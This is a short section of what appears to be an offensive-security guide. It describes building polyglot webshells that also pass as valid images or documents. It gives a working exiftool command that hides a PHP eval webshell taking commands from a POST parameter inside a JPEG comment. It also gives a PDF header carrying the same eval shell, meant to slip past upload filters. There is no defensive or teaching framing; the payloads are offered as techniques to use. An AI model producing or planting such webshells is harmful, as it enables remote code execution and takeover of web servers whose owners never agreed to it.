### 4.5 AI-Driven Polyglot WebShell

Generate WebShell files that are valid in multiple languages simultaneously.

**PHP + JPG polyglot:**

```
Create a file that is both a valid JPEG image and a valid PHP WebShell.
The JPEG header bytes must be preserved, and the PHP code must be
embedded in EXIF comments.

Command:
$ exiftool -Comment='<?php @eval($_POST["cmd"]); ?>' original.jpg -o shell.jpg
```

**PHP + PDF polyglot:**

```
%PDF-1.4
%<?php @eval($_POST['cmd']); __halt_compiler(); ?>
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
... (valid PDF structure continues)
```

---



---
📖 本切片 3/3 结束。 本章节结束。